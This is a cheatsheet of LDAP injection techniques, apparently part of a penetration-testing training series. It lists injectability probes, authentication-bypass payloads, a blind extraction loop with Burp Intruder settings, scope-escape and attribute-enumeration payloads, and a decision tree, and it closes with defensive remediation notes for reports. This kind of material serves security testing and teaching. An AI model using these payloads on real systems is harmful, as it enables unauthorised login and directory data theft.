# LDAP Injection — Cheatsheet

Quick-reference only. Every entry here is explained in full in files 01–06 — use this for fast lookup during an engagement, not as your first read.

## Filter Grammar Quick Reference

| Symbol | Meaning |
|---|---|
| `&` | AND (prefix — applies to all following conditions in the group) |
| `\|` | OR (prefix) |
| `!` | NOT (negates the single following filter) |
| `=` | Equality |
| `>=` `<=` | Ordered comparison (matching-rule dependent) |
| `~=` | Approximate match |
| `*` | Wildcard |
| `(attr=*)` | Presence test |
| `\28 \29 \2a \5c \00` | Hex escapes for `( ) * \` NUL — their *absence* on user input = vulnerable |

## Step 0 — Confirm Injectability

```
*           → look for behavior change
)           → look for syntax error
)(          → compare error type vs lone )
```

## Authentication Bypass (file 03)

| Goal | Payload (username field unless noted) |
|---|---|
| Log in as anyone (return-all) | `*)(uid=*))(\|(uid=*` |
| Log in as known user, blank-password style | `*)(&(uid=admin))` *(in password field, when username already resolves)* |
| Abuse a NOT-based status check | `*)(!(accountStatus=*` |

## Blind Extraction Loop (file 04)

```
Establish oracle:
  TRUE  → *)(objectClass=*
  FALSE → *)(objectClass=NonexistentValue12345

Extract character-by-character:
  *)(attribute=KNOWN_PREFIX + candidate_char + *
  → extend KNOWN_PREFIX when oracle returns TRUE
  → stop when no candidate_char returns TRUE
```

Burp Intruder setup: Sniper attack, marker at candidate-char position, Simple List/Brute-forcer payload = target alphabet, Grep-Match on confirmed TRUE indicator.

## Data Extraction / Scope Bypass (file 05)

| Goal | Payload pattern |
|---|---|
| Escape a department/scope restriction | `*))(\|(cn=*` |
| Test if an attribute exists | `*)(attributeName=*` |
| Enumerate AD group membership | `*)(memberOf=*GroupName*` |

## Decision Tree

```
Is there a login/auth feature backed by LDAP?
  → Try Authentication Bypass payloads (file 03) first — highest impact, fastest to test in Repeater.

Does a search/lookup feature reflect results directly?
  → Use Data Extraction techniques (file 05) — wildcard scope escape, attribute enumeration.

Does the app give you no visible result data, only success/fail or generic messages?
  → You're in Blind territory (file 04) — establish a true/false oracle, then automate
    extraction via Burp Intruder or the Python script template (file 06).

Always run Step 0 (confirm injectability) before anything else.
```

## Tooling Reminder

- **No sqlmap-equivalent exists.** Primary tools: Burp Repeater + Intruder, `ldapsearch` for lab/protocol validation, short custom Python scripts for bulk blind extraction.
- **No dedicated PortSwigger Academy lab track exists for this vulnerability class** (see file 01, section 6, for full detail). Practice via OWASP WebGoat's LDAP Injection lesson or a self-hosted OpenLDAP + custom vulnerable app (setup script in file 06, section 4).

## Defensive Reference (for report-writing)

- Parameterize LDAP queries — most modern LDAP client libraries (e.g., `ldap3`'s filter-building helpers, .NET's `System.DirectoryServices.Protocols` with proper escaping) provide safe filter construction; flag raw string concatenation as the root cause in findings.
- Escape `( ) * \` and NUL in all user-controlled filter input server-side, regardless of client-side validation.
- Authenticate via a real LDAP bind operation, never via a search-filter password comparison (Pattern A in file 03 is the anti-pattern to call out explicitly in a report).
- Apply least-privilege bind accounts for application-layer LDAP queries so that even a successful injection can't read attributes/subtrees outside what the feature legitimately needs.

## File Index

| File | Covers |
|---|---|
| 01 | Overview, classification, OWASP/CWE mapping, tooling reality, lab coverage gap |
| 02 | Filter grammar reference (read before any payload file) |
| 03 | Authentication bypass |
| 04 | Blind LDAP injection |
| 05 | Data extraction via search filters |
| 06 | Manual exploitation methodology, Burp Intruder config, Python script, self-hosted lab |
| 07 (this file) | Condensed cheatsheet |
